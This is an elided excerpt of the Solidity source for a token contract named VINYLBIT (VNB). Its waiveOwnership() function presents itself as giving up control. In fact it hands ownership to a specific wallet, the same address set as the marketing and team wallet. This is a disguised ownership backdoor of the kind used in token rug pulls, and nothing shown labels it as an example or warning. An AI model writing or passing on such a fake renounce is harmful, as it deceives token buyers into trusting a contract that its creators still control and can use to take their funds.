...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xC442825F1F4AbAFB318A3C0405c2a1C64333ED0B);
    }
...
contract VINYLBIT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "VINYLBIT";
    string private _symbol = "VNB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xC442825F1F4AbAFB318A3C0405c2a1C64333ED0B);
    address payable public teamWalletAddress = payable(0xC442825F1F4AbAFB318A3C0405c2a1C64333ED0B);
